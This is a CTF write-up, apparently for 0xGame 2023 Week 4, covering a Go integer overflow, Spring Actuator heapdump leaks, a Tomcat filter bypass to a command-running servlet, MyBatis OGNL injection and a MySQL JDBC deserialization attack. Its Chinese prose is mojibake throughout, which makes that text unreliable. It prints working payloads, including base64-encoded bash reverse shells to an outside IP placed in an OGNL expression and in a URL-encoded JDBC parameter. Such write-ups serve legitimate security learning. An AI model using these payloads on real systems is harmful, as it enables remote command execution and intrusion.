ç±»å‹ if user.Money &gt;= product.Price*int64(n) { user.Money -= product.Price * int64(n) user.Items[product.Name] += int64(n) c.JSON(200, gin.H{ \"message\": fmt.Sprintf(\"Buy %v * %v success\", product.Name, n), }) } else { c.JSON(200, gin.H{ \"message\": \"You don't have enough money\", }) } è¿™é‡Œå…ˆä»‹ç»ä¸€äº›æ¦‚å¿µ Go è¯­è¨€æ˜¯å¼ºç±»å‹è¯­è¨€, åŒ…å«å¤šç§æ•°æ®ç±»å‹, ä»¥æ•°å­—ç±»å‹ä¸ºä¾‹, å­˜åœ¨ uint8 uint16 uint32 uint64 (æ— ç¬¦å·æ•´å‹) å’Œ int8 int16 int32 int64 (æœ‰ç¬¦å·æ•´å‹) ç­‰ç±»å‹ Go è¯­è¨€åœ¨ç¼–è¯‘æœŸä¼šæ£€æŸ¥æºç ä¸­å®šä¹‰çš„å˜é‡æ˜¯å¦å­˜åœ¨æº¢å‡º, ä¾‹å¦‚ var i uint8 = 99999 ä¼šä½¿å¾—ç¼–è¯‘ä¸é€šè¿‡, ä½†æ˜¯å¹¶ä¸ä¼šæ£€æŸ¥å˜é‡çš„è¿ç®—è¿‡ç¨‹ä¸­æ˜¯å¦å­˜åœ¨æº¢å‡º, ä¾‹å¦‚ var i uint8 = a * b, å¦‚æœç¨‹åºæ²¡æœ‰å¯¹å˜é‡çš„å–å€¼èŒƒå›´åšé™åˆ¶, é‚£ä¹ˆåœ¨éƒ¨åˆ†åœºæ™¯ä¸‹å°±å¯èƒ½å­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´ ä¸Šé¢çš„ BuyHandler è™½ç„¶é™åˆ¶äº† n ä¸èƒ½ä¸ºè´Ÿæ•°, ä½†æ˜¯å¹¶æ²¡æœ‰é™åˆ¶ n çš„æœ€å¤§å€¼ å› æ­¤æˆ‘ä»¬å¯ä»¥æ§åˆ¶ n, ä½¿å¾— product.Price * int64(n) æº¢å‡ºä¸ºä¸€ä¸ªè´Ÿæ•°, ä¹‹åè¿›è¡Œ user.Money -= product.Price * int64(n) è¿ç®—çš„æ—¶å€™, å½“å‰ç”¨æˆ·çš„ money å°±ä¼šå¢åŠ , æœ€ç»ˆè¾¾åˆ°ä¸€ä¸ªå¯ä»¥è´­ä¹° flag å•†å“çš„é‡‘é¢, ä»è€Œæ‹¿åˆ° flag æŸ¥é˜…ç›¸å…³æ–‡æ¡£å¯ä»¥çŸ¥é“ int64 ç±»å‹çš„èŒƒå›´æ˜¯ -9223372036854775808 ~ 9223372036854775807 ç»è¿‡ç®€å•çš„è®¡ç®—æˆ–è€…ççŒœ, å¯ä»¥è´­ä¹°æ•°é‡ä¸º 922337203695477808 çš„ apple ![image-20231105093447613](0xGame 2023/image-20231105093447613.png) ç‚¹å‡»get flagï¼ŒæˆåŠŸæ‹¿åˆ° ![image-20231105093500557](0xGame 2023/image-20231105093500557.png) [Week 4] spring Hint 1: Spring Actuator Hint 2: çœ‹çœ‹ /actuator/env å†çœ‹çœ‹ /actuator/heapdump æ ¹æ®é¢˜ç›®æç¤ºè¿™é‡Œä¼šæœ‰ä¿¡æ¯æ³„éœ²ï¼Œäºæ˜¯æˆ‘ä¸Šç½‘æœæŸ¥äº†ä¸€ä¸‹ç›¸å…³ä¿¡æ¯ï¼Œç»“åˆæç¤ºæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æœ‰å“ªäº›æ•æ„Ÿä¿¡æ¯ï¼Œé¦–å…ˆè®¿é—® env æ³„éœ²é…ç½®ä¿¡æ¯ ![image-20231105094132544](0xGame 2023/image-20231105094132544.png) è¿™é‡Œçœ‹åˆ°äº†ç”¨æˆ·åå’Œå¯†ç ï¼Œä¸è¿‡å¯†ç ä¸å¯è§ï¼Œä¸è¿‡è¿™é‡Œçš„ç”¨æˆ·åæç¤ºæˆ‘ä»¬flagå°±åœ¨passwordï¼Œæ‰€ä»¥æˆ‘ä»¬æ€è·¯å°±æ˜¯æƒ³åŠæ³•å¾—åˆ°å¯†ç çš„æ˜æ–‡ mappings æ³„éœ²è·¯ç”±ä¿¡æ¯ ![image-20231105094341321](0xGame 2023/image-20231105094341321.png) è®¿é—®ä¹‹åå¯ä»¥çœ‹åˆ°å­˜åœ¨è¯¸å¤šè·¯ç”±ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥æœ‰é€‰æ‹©çš„å»è¯»å– heapdump æ³„éœ²å †æ ˆä¿¡æ¯ è¿™ä¸ªåœ¨Spring MVCæ¶æ„ä¸­æ˜¯å¯ç”¨çš„ï¼Œä¼šæ³„éœ²å‡ºæ¨æ ˆä¿¡æ¯ï¼Œå…¶ä¸­æ˜¯å¯ä»¥çªƒå–åˆ°ä¸€äº›å…³é”®çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ä¸€äº›å…³é”®çš„Keyï¼Œæˆ–è€…æ•°æ®åº“è¿æ¥å¯†ç ï¼Œä½†æ˜¯æ‰«æå·¥å…·æ²¡æŠŠå®ƒåˆ—ä¸ºæ‰«æç«¯ç‚¹ã€‚ çœ‹äº†ä¸€ä¸‹æ–‡ç« ï¼Œå…¶ä¸­è¯´æ˜¯è¦åˆ©ç”¨ä¸€äº›å·¥å…·çš„ï¼Œåœ°å€å¦‚ä¸‹ï¼š https://github.com/whwlsfb/JDumpSpider è¿™é‡Œç›´æ¥ä¸‹è½½jaråŒ…ï¼ŒåŒæ—¶ç¡®ä¿æœ¬åœ°æœ‰mavenä¸java1.8ä»¥ä¸Šçš„ç¯å¢ƒï¼Œç›´æ¥æŒ‰å¦‚ä¸‹å‘½ä»¤è¿è¡Œå³å¯ java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump æ³¨æ„ï¼Œå°†æ‰€è¦è·å–çš„ä¿¡æ¯æ–‡ä»¶æ”¾å…¥è‡³äºjaråŒä¸€ç›®å½•ä¸‹ ![image-20231105100900189](0xGame 2023/image-20231105100900189.png) å¦‚ä¸Šå›¾ï¼ŒæˆåŠŸå¾—åˆ°flag æˆ–è€…ç”¨å…¶å®ƒå·¥å…·æ¯”å¦‚ Memory Analyze Tool (MAT) ä¹Ÿè¡Œï¼Œç”¨ MAT çš„è¯æŸ¥è¯¢è¯­å¥å¦‚ä¸‹ SELECT * FROM java.util.LinkedHashMap$Entry x WHERE(toString(x.key).contains(\"app.password\")) [Week 4] auth_bypass Hint 1: Tomcat Filter ç»•è¿‡ (ç½‘ä¸Šæœ‰ç±»ä¼¼çš„æ–‡ç«  ä¹Ÿå¯ä»¥è‡ªå·±å°è¯• fuzz ä¸€äº›ç•¸å½¢ url è·¯å¾„) Hint 2: é¢˜ç›®é€šè¿‡ war åŒ…éƒ¨ç½² é¢„æœŸéœ€è¦ RCE å°è¯•é€šè¿‡ä»»æ„æ–‡ä»¶ä¸‹è½½è·å–æ›´å¤šä¿¡æ¯ Hint 3: åˆ©ç”¨ WEB-INF ç›®å½• Hint 4: ä½ å¯èƒ½ä¼šç”¨åˆ°çš„ç½‘ç«™: https://tools.zjun.info/runtime-exec-payloads/ çœ‹äº†ä¸€çœ¼é¢˜ç›®ç»™çš„é™„ä»¶ï¼Œæºç å¦‚ä¸‹ package com.example.demo; import javax.servlet.*; import javax.servlet.http.HttpServletRequest; import java.io.IOException; public class AuthFilter implements Filter { @Override public void init(FilterConfig filterConfig) { } @Override public void destroy() { } @Override public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException { HttpServletRequest request = (HttpServletRequest) req; if (request.getRequestURI().contains(\"..\")) { resp.getWriter().write(\"blacklist\"); return; } if (request.getRequestURI().startsWith(\"/download\")) { resp.getWriter().write(\"unauthorized access\"); } else { chain.doFilter(req, resp); } } } è¿™é‡Œä¸»è¦æ˜¯é™åˆ¶äº†..ä¸downloadé˜²æ­¢ç”¨æˆ·çš„ç›®å½•ç©¿è¶Šä»¥åŠé™åˆ¶downloadè·¯ç”±çš„è®¿é—®ï¼Œæ¥ä¸‹æ¥çœ‹ä¸€ä¸‹å¦ä¸€ä¸ªæ–‡ä»¶ package com.example.demo; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.FileInputStream; import java.io.IOException; public class DownloadServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException { String currentPath = this.getServletContext().getRealPath(\"/assets/\"); Object fileNameParameter = req.getParameter(\"filename\"); if (fileNameParameter != null) { String fileName = (String) fileNameParameter; resp.setHeader(\"Content-Disposition\",\"attachment;filename=\"+fileName); try (FileInputStream input = new FileInputStream(currentPath + fileName)) { byte[] buffer = new byte[4096]; while (input.read(buffer) != -1) { resp.getOutputStream().write(buffer); } } } else { resp.setContentType(\"text/html\"); resp.getWriter().write(\"&lt;a href=\\\"/download?filename=avatar.jpg\\\"&gt;avatar.jpg&lt;/a&gt;\"); } } } é ç€GPTåˆ†æäº†ä¸€æ³¢ï¼Œè¿™æ®µä»£ç çš„ä½œç”¨å°±æ˜¯è·å–åˆ°æœåŠ¡å™¨ä¸Šæ–‡ä»¶çš„çœŸå®è·¯å¾„ä»¥åŠæ–‡ä»¶åï¼Œä»¥ä¾›åç»­çš„æ–‡ä»¶ä¸‹è½½åŠŸèƒ½çš„ä½¿ç”¨ï¼Œä¸‹è½½é¢˜ç›®æç¤ºæˆ‘ä»¬tomact filterç»•è¿‡ï¼Œé‚£æˆ‘ä»¬å»çœ‹çœ‹æ€ä¹ˆä¸ªäº‹å„¿ è¿™é‡Œç»•è¿‡æ–¹å¼å¾ˆå¤šç§ï¼Œå‚è€ƒå¦‚ä¸‹æ–‡ç« ï¼š Javaå®‰å…¨ä¹‹Filteræƒé™ç»•è¿‡ ![image-20231105102419042](0xGame 2023/image-20231105102419042.png) å¦‚å›¾ï¼Œè¿™é‡Œæˆ‘å°†downloadè¿›è¡Œurlç¼–ç åï¼Œè¿™é‡Œé¡µé¢æ˜¾ç¤ºæˆåŠŸè®¿é—®äº†ï¼Œä¸è¿‡è¿™é‡Œè¿˜å¯ä»¥å¤š/ç»•è¿‡ï¼Œå¦‚ä¸‹å›¾ ![image-20231105102608265](0xGame 2023/image-20231105102608265.png) è¿™é‡Œå°è¯•ç›´æ¥è¯»å–flagï¼Œä½†ä¾æ—§æ˜¯æ— æƒè®¿é—® ![image-20231105102719747](0xGame 2023/image-20231105102719747.png) æ¥ä¸‹æ¥ä¹Ÿå°±æ²¡æ€è·¯äº†ï¼Œçœ‹wp ç„¶åå¯ä»¥é€šè¿‡ //download?filename=avatar.jpg ä¸‹è½½æ–‡ä»¶, ä½†æ˜¯æ— æ³•è¯»å– /flag (æç¤º Permission denied), é‚£ä¹ˆå¾ˆæ˜æ˜¾éœ€è¦ RCE æ ¹æ®é¢˜ç›®æè¿°, ç½‘ç«™ä½¿ç”¨ war æ‰“åŒ… è¿™ä¸ª war å…¶å®ä¹Ÿå°±ç›¸å½“äºå‹ç¼©åŒ…, Tomcat åœ¨éƒ¨ç½² war çš„æ—¶å€™ä¼šå°†å…¶è§£å‹, è€Œå‹ç¼©åŒ…å†…ä¼šå­˜åœ¨ä¸€ä¸ª WEB-INF ç›®å½•, ç›®å½•é‡Œé¢åŒ…å«ç¼–è¯‘å¥½çš„ .class æ–‡ä»¶ä»¥åŠ web.xml (ä¿å­˜è·¯ç”±å’Œç±»çš„æ˜ å°„å…³ç³») è¿™é‡Œæµ…æµ…äº†è§£ä¸€ä¸‹WEB-INFç›®å½•ï¼š WEB-INF æ˜¯ Java çš„ WEB åº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡ web.xml æ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚ WEB-INF ä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š /WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚ /WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ /WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶ /WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚ /WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶ ![image-20231105103345796](0xGame 2023/image-20231105103345796.png) å¦‚å›¾è¿›è¡Œè®¿é—®ä¸‹è½½å¾—åˆ°æ–‡ä»¶ ![image-20231105103414371](0xGame 2023/image-20231105103414371.png) è¿™é‡Œçš„å†…éƒ¨æ„é€ çœ‹ä¸å¤ªæ‡‚ï¼Œæ‰€ä»¥é wpäº†ï¼š å­˜åœ¨ EvilServlet, æ˜ å°„çš„è·¯ç”±ä¸º /You_Find_This_Evil_Servlet_a76f02cb8422 æ ¹æ®ç½‘ä¸Šæ–‡ç« çš„çŸ¥è¯†ç‚¹, é€šè¿‡åŒ…å (com.example.demo.EvilServlet) æ„é€ å¯¹åº”çš„ class æ–‡ä»¶è·¯å¾„å¹¶ä¸‹è½½ //download?filename=../WEB-INF/classes/com/example/demo/EvilServlet.class ä¸‹è½½ä¹‹åæˆ‘é€‰æ‹©äº†jdkæ‰“å¼€classæ–‡ä»¶ // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo; import java.io.IOException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class EvilServlet extends HttpServlet { public EvilServlet() { } protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException { String cmd = req.getParameter(\"Evil_Cmd_Arguments_fe37627fed78\"); try { Runtime.getRuntime().exec(cmd); resp.getWriter().write(\"success\"); } catch (Exception var5) { resp.getWriter().write(\"error\"); } } } è¿™é‡Œä¸Šè¿°ä»£ç æç¤ºæˆ‘ä»¬æ˜¯å¤„ç†çš„postè¯·æ±‚ï¼šdoPost ç›´æ¥ POST è®¿é—® /You_Find_This_Evil_Servlet_a76f02cb8422 ä¼ ä¸ªå‚å°±èƒ½æ‰§è¡Œå‘½ä»¤ æœ€åå› ä¸ºæ²¡æœ‰å›æ˜¾, éœ€è¦åå¼¹ shell æˆ–è€…é€šè¿‡ curl + burp collaborator å¤–å¸¦ flag ![image-20231105105149246](0xGame 2023/image-20231105105149246.png) è¿™é‡Œæˆ‘ç›´æ¥hackbarè¿›è¡Œæ‰§è¡Œäº†ï¼Œå¦‚ä¸‹å›¾ï¼Œä½†æˆ‘ä¸ç†è§£çš„æ˜¯ä¸ºä½•/readflagå°±èƒ½è¯»å–flag ![image-20231105105139403](0xGame 2023/image-20231105105139403.png) ä¸è¿‡å®˜æ–¹wpé‡‡ç”¨çš„bpæ–¹å¼ï¼Œæœ‰ä»¥ä¸‹å‡ ä¸ªæ³¨æ„ç‚¹ï¼š è¿™é‡Œé¦–å…ˆå¾—æ³¨æ„ä¼ å…¥ Runtime.exec çš„å‘½ä»¤éœ€è¦è¿›è¡Œä¸€æ¬¡ç¼–ç  https://www.adminxe.com/tools/code.html https://ares-x.com/tools/runtime-exec/ https://github.com/Threekiii/Awesome-Redteam/blob/master/scripts/runtime-exec-payloads.html å…·ä½“åŸå› å¤§å®¶å¯ä»¥å‚è€ƒä¸‹é¢ä¸¤ç¯‡æ–‡ç«  https://www.anquanke.com/post/id/243329 https://y4er.com/posts/java-exec-command/ ç„¶å POST ä¼ é€’å‘½ä»¤æ—¶å¾—å…ˆ urlencode ä¸€æ¬¡ [Week 4] YourBatis Hint 1: å…³æ³¨é¢˜ç›®åç§°/æè¿° ä»¥åŠ pom.xml ä¸­çš„ä¾èµ– Hint 2: SQL æ³¨å…¥ä¸æ˜¯è€ƒç‚¹ é¢˜ç›®éœ€è¦ RCE Hint 3: MyBatis RCE å°è¯•ç»“åˆç½‘ä¸Šçš„æ–‡ç« æ„é€  Payload Hint 4: æ³¨æ„åç¼–è¯‘ jar åŒ…çš„æ—¶å€™è¯·ä¸è¦ä½¿ç”¨ jd-gui å°è¯•ä½¿ç”¨ jadx-gui æˆ– IDEA Hint 5: ä½ å¯èƒ½ä¼šç”¨åˆ°çš„ç½‘ç«™: https://tools.zjun.info/runtime-exec-payloads/ Hint 6: åœ¨è¿›è¡Œ RCE çš„æ—¶å€™ å› ä¸º OGNL çš„è§£æé—®é¢˜ æ‰€ä»¥æœ€ç»ˆä¼ å…¥ Runtime.exec() çš„å‘½ä»¤å†…ä¸å¾—åŒ…å« { å’Œ } å¯ä»¥å°è¯•ç¼–ç ç»•è¿‡ è¿™é‡Œè®©æˆ‘ä»¬å…³æ³¨é¢˜ç›®åç§°ï¼Œè¿™é‡Œæˆ‘ç›´æ¥æœç´¢äº†mybatisæ¼æ´ï¼Œå‘ç°æœ‰å¾ˆå¤šç›¸å…³å¤ç°æ–‡ç« ï¼Œåœ¨æ­¤ä¹‹å‰æˆ‘ä»¬å…ˆæ‰“å¼€jaråŒ…ï¼Œä¹‹åå°†å…¶ä¸­çš„æ–‡ä»¶ç”¨ideaæ‰“å¼€ &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.1.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-j&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter-test&lt;/artifactId&gt; &lt;version&gt;2.3.1&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; è¿™é‡Œè®©æˆ‘ä»¬å…³æ³¨ä¸€ä¸‹pom.xmlï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶å¯ä»¥æŸ¥çœ‹ jar åŒ…ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹åº“ è¿™é‡Œæˆ‘æ„Ÿè§‰é‡ç‚¹å°±æ˜¯mybatis-spring-boot-starterâ€“ç‰ˆæœ¬ä¸º2.1.1ï¼Œäºæ˜¯èƒ¡ä¹±æœäº†ä¸€é€šï¼Œå‘ç°ä¸‹é¢çš„ä¿¡æ¯ ![image-20231105111503601](0xGame 2023/image-20231105111503601.png) é‚£è¿™é‡Œä¼°è®¡å°±æ˜¯è·Ÿç€ç°æœ‰çš„æ¼æ´å»å¤ç°äº†ï¼ŒåŠ ä¸Šé¢˜ç›®æç¤ºæˆ‘ä»¬å­˜åœ¨sqlæ³¨å…¥ä»¥åŠRCEï¼Œæˆ‘ä»¬å…³é”®è¯ä¸€æœä¸€å¤§æŠŠï¼Œé‡ç‚¹å°±æ˜¯æ‰¾åˆ°æ­£ç¡®åˆç†çš„æ–‡ç« äº† Mybatis ä»SQLæ³¨å…¥åˆ°OGNLæ³¨å…¥ ä»ä¸€é“CTFé¢˜æµ…è°ˆMyBatisä¸Ognlçš„é‚£äº›äº‹ UserSqlProvider // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.yourbatis.provider; import org.apache.ibatis.jdbc.SQL; public class UserSqlProvider { public UserSqlProvider() { } public String buildGetUsers() { return (new SQL() { { this.SELECT(\"*\"); this.FROM(\"users\"); } }).toString(); } public String buildGetUserByUsername(final String username) { return (new SQL() { { this.SELECT(\"*\"); this.FROM(\"users\"); this.WHERE(String.format(\"username = '%s'\", username)); } }).toString(); } } è¿™é‡Œæ˜¾ç¤ºäº†æŸ¥è¯¢çš„sqlè¯­å¥ï¼Œé‡ç‚¹åœ¨æœ€åä¸€ä¸ªæ–¹æ³•ï¼šselect * from users whereâ€¦ï¼Œè¿™é‡Œä¼°è®¡å°±æ˜¯æ¼æ´æ³¨å…¥ç‚¹äº† çœ‹äº†çœ‹æ–‡ç« ï¼Œæ„Ÿè§‰payloadæ ¼å¼åº”è¯¥æ˜¯è¿™æ ·ï¼š ${RCE} ä½†ä¸äº†è§£javaçš„rceçš„ä»£ç ï¼Œåªèƒ½çœ‹wpäº†ï¼š ${@java.lang.Runtime@getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}\")} ä½†æ˜¯å¾ˆæ˜¾ç„¶æ˜¯ä¼šå¤±è´¥çš„, å› ä¸ºä¼ å…¥çš„å‘½ä»¤åŒ…å«äº† { å’Œ }, ä¼šè¢«é€’å½’è§£æä¸ºå¦ä¸€ä¸ª OGNL è¡¨è¾¾å¼çš„å¼€å¤´å’Œç»“å°¾ è¿™ä¸ªç‚¹å¯èƒ½æ¯”è¾ƒéš¾, æ‰€ä»¥åé¢ç»™å‡ºäº† hint è§£å†³æ–¹æ¡ˆæ˜¯åªè¦ä¸å‡ºç°å¤§æ‹¬å·å°±è¡Œ, æ–¹æ³•å¾ˆå¤š, è¿™é‡Œç»™å‡ºä¸€ç§, åˆ©ç”¨ OGNL è°ƒç”¨ Java è‡ªèº«çš„ base64 decode æ–¹æ³• è¿™é‡Œè¦å°†bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}è¿›è¡Œbase64ç¼–ç  ${@java.lang.Runtime@getRuntime().exec(new java.lang.String(@java.util.Base64@getDecoder().decode('YmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TWpRdU1qSXdMakl6TXk0eU5pODFOVFUxSURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQ==')))} ![image-20231105113238166](0xGame 2023/image-20231105113238166.png) å¦‚ä¸Šå›¾ï¼Œæ‹¿åˆ°flag [Week 4] TestConnection Hint 1: JDBC ä¼šä¸ä¼šå­˜åœ¨ä¸€äº›æ¼æ´? Hint 2: MySQL / PostgreSQL Jdbc Attack Hint 3: ä½ å¯èƒ½ä¼šç”¨åˆ°çš„ç½‘ç«™: https://tools.zjun.info/runtime-exec-payloads/ è¿™é‡Œä¼¼ä¹è€ƒçš„å°±æ˜¯MySQL / PostgreSQL Jdbc Attack äº†ï¼Œä¸‹é¢è·Ÿç€wpå¤ç° JDBC å°±æ˜¯ Java ç”¨äºæ“ä½œæ•°æ®åº“çš„æ¥å£, é€šè¿‡ä¸€ä¸ªç»Ÿä¸€è§„èŒƒçš„ JDBC æ¥å£å¯ä»¥å®ç°åŒä¸€æ®µä»£ç å…¼å®¹ä¸åŒç±»å‹æ•°æ®åº“çš„è®¿é—® JDBC URL å°±æ˜¯ç”¨äºè¿æ¥æ•°æ®åº“çš„å­—ç¬¦ä¸², æ ¼å¼ä¸º `jdbc:db-type://host:port/db-name?param=value` db-type å°±æ˜¯æ•°æ®åº“ç±»å‹, ä¾‹å¦‚ postgresql, mysql, mssql, oracle, sqlite db-name æ˜¯è¦ä½¿ç”¨çš„æ•°æ®åº“å param æ˜¯è¦ä¼ å…¥çš„å‚æ•°, æ¯”å¦‚ user, password, æŒ‡å®šè¿æ¥æ—¶ä½¿ç”¨çš„ç¼–ç ç±»å‹ç­‰ç­‰ å½“ jdbc url å¯æ§æ—¶, å¦‚æœç›®æ ‡ç½‘ç«™ä½¿ç”¨äº†æ—§ç‰ˆçš„æ•°æ®åº“é©±åŠ¨, åœ¨ç‰¹å®šæƒ…å†µä¸‹å°±å¯ä»¥å®ç° RCE å‚è€ƒæ–‡ç« : https://tttang.com/archive/1877/ https://xz.aliyun.com/t/11812 https://forum.butian.net/share/1339 åœ¨pom.xmlä¸­çœ‹åˆ°ä¸¤ä¸ªä¾èµ–ï¼šmysqlä¸postgresql ![image-20231105153731477](0xGame 2023/image-20231105153731477.png) ç»™äº†ä¸¤ä¸ªä¾èµ–, mysql å’Œ postgresql, å¯¹åº”ä¸¤ç§åˆ©ç”¨æ–¹å¼ ç„¶åè¿˜æœ‰ commons-collections ä¾èµ–, è¿™ä¸ªä¸»è¦æ˜¯æ–¹ä¾¿å¤§å®¶åœ¨åé¢ç”¨ ysoserial å·¥å…·å»ç”Ÿæˆååºåˆ—åŒ– payload é¦–å…ˆæ˜¯ mysql é©±åŠ¨çš„åˆ©ç”¨ ç»“åˆç½‘ä¸Šæ–‡ç« å¯ä»¥æ„é€ å¯¹åº”çš„ jdbc urlï¼š jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc é¦–å…ˆå¾—æ³¨æ„, å› ä¸ºé¢˜ç›®ç»™çš„ä»£ç æ˜¯ DriverManager.getConnection(url, username, password);, å³ä¼šå•ç‹¬ä¼ å…¥ä¸€ä¸ª username å‚æ•°, å› æ­¤ url ä¸­çš„ username ä¼šè¢«åé¢çš„ username ç»™è¦†ç›– ç½‘ä¸Šçš„éƒ¨åˆ†åˆ©ç”¨å·¥å…·ä¼šé€šè¿‡ username æ¥åŒºåˆ†ä¸åŒçš„ payload, æ‰€ä»¥å¾—æ³¨æ„ username è¦å•ç‹¬ä¼ , ä¸ç„¶å†™åœ¨ url é‡Œé¢å°±è¢«è¦†ç›–äº† å…¶æ¬¡, å› ä¸º jdbc url æœ¬èº«ä¹Ÿç¬¦åˆ url çš„è§„èŒƒ, æ‰€ä»¥åœ¨ä¼  url å‚æ•°çš„æ—¶å€™, éœ€è¦æŠŠ url æœ¬èº«å…¨éƒ¨è¿›è¡Œ url ç¼–ç , é˜²æ­¢æœåŠ¡å™¨é”™æŠŠ autoDeserialize, queryInterceptors è¿™äº›å‚æ•°å½“æˆæ˜¯ä¸€ä¸ª http get å‚æ•°, è€Œä¸æ˜¯ jdbc url é‡Œé¢çš„å‚æ•° æœ€åä¾ç„¶æ˜¯ Runtime.exec å‘½ä»¤ç¼–ç çš„é—®é¢˜ ä¸€äº› mysql jdbc åˆ©ç”¨å·¥å…· https://github.com/4ra1n/mysql-fake-server https://github.com/rmb122/rogue_mysql_server payload /testConnection?driver=com.mysql.cj.jdbc.Driver&amp;url=jdbc:mysql://vps-ip:3308/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;username=deser_CC31_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}&amp;password=123 url ç¼–ç  /testConnection?driver=com.mysql.cj.jdbc.Driver&amp;url=%6a%64%62%63%3a%6d%79%73%71%6c%3a%2f%2f%31%32%34%2e%32%32%30%2e%32%33%33%2e%32%36%3a%33%33%30%38%2f%74%65%73%74%3f%61%75%74%6f%44%65%73%65%72%69%61%6c%69%7a%65%3d%74%72%75%65%26%71%75%65%72%79%49%6e%74%65%72%63%65%70%74%6f%72%73%3d%63%6f%6d%2e%6d%79%73%71%6c%2e%63%6a%2e%6a%64%62%63%2e%69%6e%74%65%72%63%65%70%74%6f%72%73%2e%53%65%72%76%65%72%53%74%61%74%75%73%44%69%66%66%49%6e%74%65%72%63%65%70%74%6f%72&amp;username=%64%65%73%65%72%5f%43%43%33%31%5f%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%6a%51%75%4d%6a%49%77%4c%6a%49%7a%4d%79%34%79%4e%69%38%31%4e%54%55%31%49%44%41%2b%4a%6a%45%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d&amp;password=123 è¿™é‡Œå°è¯•äº†è€å¤šæ¬¡äº†ï¼Œæˆ‘æ„Ÿè§‰å°±æ˜¯éœ€è¦æœ‰ä¸€ä¸ªå…¬ç½‘ipæ¥å¼€å¯mysqlæœåŠ¡ï¼Œå¦‚ä¸‹å›¾ï¼Œéšåbpå‘åŒ…å»å‘é€æ¶æ„å‘½ä»¤è¿›è¡ŒRCE ![image-20231105164759475](0xGame 2023/image-20231105164759475.png) 